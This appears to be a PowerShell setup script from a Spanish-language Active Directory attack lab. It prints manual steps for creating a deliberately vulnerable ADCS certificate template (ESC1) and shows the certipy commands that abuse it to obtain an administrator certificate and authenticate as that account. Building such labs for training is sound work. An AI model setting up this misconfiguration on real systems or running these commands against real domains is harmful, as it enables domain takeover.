Import-Module ActiveDirectory

Write-Host "============================================" -ForegroundColor Yellow
Write-Host "  AD Attack Lab - 06_esc1_template.ps1" -ForegroundColor Yellow
Write-Host "  Solo para uso en laboratorio controlado" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Yellow

Write-Host ""
Write-Host "[BLOQUE 6] Configurando template vulnerable ESC1..." -ForegroundColor Cyan
Write-Host ""

Write-Host "[*] La duplicacion automatica del template User no esta soportada por este script." -ForegroundColor Yellow
Write-Host ""
Write-Host "Realiza estos pasos manualmente:" -ForegroundColor White
Write-Host ""
Write-Host "1. Ejecuta certtmpl.msc" -ForegroundColor Gray
Write-Host "2. Click derecho sobre 'User'" -ForegroundColor Gray
Write-Host "3. Duplicate Template" -ForegroundColor Gray
Write-Host "4. Nombre: CorpUserCert" -ForegroundColor Gray
Write-Host "5. Habilitar 'Supply in the request'" -ForegroundColor Gray
Write-Host "6. Mantener Client Authentication" -ForegroundColor Gray
Write-Host "7. Permitir Enroll a Domain Users" -ForegroundColor Gray
Write-Host "8. Publicar template desde certsrv.msc" -ForegroundColor Gray
Write-Host ""

Write-Host "[!] MISCONFIGURACION ESPERADA: CorpUserCert (ESC1)" -ForegroundColor Red
Write-Host "    - Enrollee supplies subject : YES" -ForegroundColor Red
Write-Host "    - Client Authentication     : YES" -ForegroundColor Red
Write-Host "    - Approval required         : NO" -ForegroundColor Red
Write-Host "    - Enrollable by             : Domain Users" -ForegroundColor Red
Write-Host ""

Write-Host "Attack path ESC1:" -ForegroundColor White
Write-Host "  certipy req -u j.smith -p Password123! -ca corp-CA -template CorpUserCert -upn administrator@corp.local" -ForegroundColor Gray
Write-Host "  certipy auth -pfx administrator.pfx -domain corp.local" -ForegroundColor Gray
Write-Host ""

Write-Host "Siguiente paso: correr 07_network_misconfigs.ps1" -ForegroundColor Cyan
